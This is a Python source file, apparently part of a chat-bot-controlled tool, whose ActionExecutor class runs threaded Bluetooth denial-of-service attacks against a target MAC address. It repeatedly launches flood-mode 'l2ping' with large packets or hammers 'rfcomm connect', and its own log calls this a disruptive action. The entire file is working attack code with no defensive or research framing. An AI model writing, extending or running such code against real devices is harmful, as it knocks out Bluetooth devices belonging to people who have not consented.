# core/action_executor.py
import logging
import subprocess
import threading
import time
from typing import Optional, Callable

LOG = logging.getLogger(__name__)

class ActionExecutor:
    def __init__(self, interface: str = "hci0", packet_size: int = 800,
                 delay: float = 0.5, threads: int = 4):
        self.interface = interface
        self.packet_size = packet_size
        self.delay = delay
        self.threads = threads
        self._active: dict[int, threading.Event] = {}   # chat_id -> stop_event

    def start(self, chat_id: int, mac: str, method: str,
              on_finish: Optional[Callable[[int, str], None]] = None) -> None:
        """Lanza la acción en un hilo separado. `method` puede ser 'rfcomm' o 'l2ping'."""
        if chat_id in self._active:
            raise RuntimeError("Ya hay una acción en curso para este chat.")
        stop_event = threading.Event()
        self._active[chat_id] = stop_event
        thread = threading.Thread(
            target=self._run,
            args=(chat_id, mac, method, stop_event, on_finish),
            daemon=True,
        )
        thread.start()

    def stop(self, chat_id: int) -> bool:
        event = self._active.get(chat_id, None)
        if event is None:
            return False
        event.set()
        self._active.pop(chat_id, None)
        return True

    def _run(self, chat_id: int, mac: str, method: str,
             stop_event: threading.Event, on_finish: Optional[Callable]) -> None:
        try:
            if method == "rfcomm":
                self._rfcomm_loop(mac, stop_event)
            elif method == "l2ping":
                self._l2ping_loop(mac, stop_event)
            else:
                raise ValueError(f"Método desconocido: {method}")
        except Exception as exc:
            LOG.exception("Error en acción disruptiva")
        finally:
            self._active.pop(chat_id, None)
            if on_finish:
                on_finish(chat_id, method)

    def _rfcomm_loop(self, mac: str, stop_event: threading.Event) -> None:
        while not stop_event.is_set():
            for _ in range(self.threads):
                if stop_event.is_set():
                    break
                try:
                    subprocess.run(
                        ["rfcomm", "connect", mac, "1"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=5,
                        check=False,
                    )
                except subprocess.TimeoutExpired:
                    LOG.debug("rfcomm connect timeout, continuando")
            time.sleep(self.delay)

    def _l2ping_loop(self, mac: str, stop_event: threading.Event) -> None:
        cmd = [
            "l2ping", "-i", self.interface,
            "-s", str(self.packet_size),
            "-f", mac,
        ]
        while not stop_event.is_set():
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            # Esperar un poco antes de relanzar o hasta que se detenga
            for _ in range(int(self.delay * 10)):
                if stop_event.is_set():
                    proc.terminate()
                    try:
                        proc.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.wait()
                    return
                time.sleep(0.1)
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()